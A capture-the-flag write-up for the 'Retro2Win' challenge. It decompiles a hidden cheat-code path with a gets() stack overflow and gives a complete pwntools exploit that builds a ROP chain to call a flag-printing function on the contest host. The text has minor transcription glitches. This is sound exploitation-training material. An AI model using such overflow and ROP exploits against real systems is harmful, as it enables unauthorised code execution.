---
description: Binary Exploitation
---

# Retro2Win

> So retro.. So winning..
>
> Author: CryptoCat

{% file src="../../.gitbook/assets/retro2win.zip" %}

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Looks like a simple ret2win. Decompiling the challenge binary in Ghidra tells me that there is a hidden cheat mode:

```c
undefined8 main(void)

{
  int local_c;
  
  do {
    while( true ) {
      while( true ) {
        show_main_menu();
        __isoc99_scanf(&DAT_00400c19,&local_c);
        getchar();
        if (local_c != 2) break;
        battle_dragon();
      }
      if (2 < local_c) break;
      if (local_c == 1) {
        explore_forest();
      }
      else {
LAB_0040093b:
        puts("Invalid choice! Please select a valid option.");
      }
    }
    if (local_c == 3) {
      puts("Quitting game...");
      return 0;
    }
    if (local_c != 0x539) goto LAB_0040093b;
    enter_cheatcode(); // LOOK HERE
  } while( true );
}
```

0x539 is 1337, so I just had to enter 1337 to enter the cheatcode function which looks like this:

```c
void enter_cheatcode(void)

{
  char local_18 [16];
  
  puts("Enter your cheatcode:");
  gets(local_18);
  printf("Checking cheatcode: %s!\n",local_18);
  return;
}
```

Simple buffer overflow with gets, so I aimed for the cheat mode which needed 2 parameters:

```c
void cheat_mode(long param_1,long param_2)

{
  char *pcVar1;
  char local_58 [72];
  FILE *local_10;
  
  if ((param_1 == 0x2323232323232323) && (param_2 == 0x4 242424242424242)) {
    puts("CHEAT MODE ACTIVATED!");
    puts("You now have access to secret developer tools...\n");
    local_10 = fopen("flag.txt","r");
    if (local_10 == (FILE *)0x0) {
      puts("Error: Could not open flag.txt");
    }
    else {
      pcVar1 = fgets(local_58,0x40,local_10);
      if (pcVar1 != (char *)0x0) {
        printf("FLAG: %s\n",local_58);
      }
      fclose(local_10);
    }
  }
  else {
    puts("Unauthorized access detected! Returning to main men u...\n");
  }
  return;
}
```

Heres both registers that are used for the parameter:

```
0040073e  48 89 7d a8         MOV            qword ptr [RBP  +  local_60 ],RDI
00400742  48 89 75 a0         MOV            qword ptr [RBP  +  local_68 ],RSI
```

The full ROP chain can be combined into one script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- template: winterbitia -*-

# ====================
# -- PWNTOOLS SETUP --
# ====================

from pwn import *

exe = context.binary = ELF(args.EXE or 'retro2win')
trm = context.terminal = ['tmux', 'splitw', '-h']

host = args.HOST or 'retro2win.ctf.intigriti.io'
port = int(args.PORT or 1338)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
break *enter_cheatcode+58
# break *cheat_mode+16
continue
'''.format(**locals())

# =======================
# -- EXPLOIT GOES HERE --
# =======================

io = start()
enter_cheat_mode = b'1337'
cheat_mode = 0x0000000000400736
POP_RDI = 0x00000000004009b3
param1 = 0x2323232323232323
POP_RSI_R15 = 0x00000000004009b1
param2 = 0x4242424242424242

log,info(io.clean())
io.sendline(enter_cheat_mode)
log.info(io.clean())

payload = flat(
    cyclic(24, n=8),
    POP_RDI,
    param1,
    POP_RSI_R15,
    param2,
    0x0,
    cheat_mode,
)
io.sendline(payload)
log.info(io.clean())

io.interactive()
```

<figure><img src="../../.gitbook/assets/Screenshot 2024-11-15 230743.png" alt=""><figcaption></figcaption></figure>
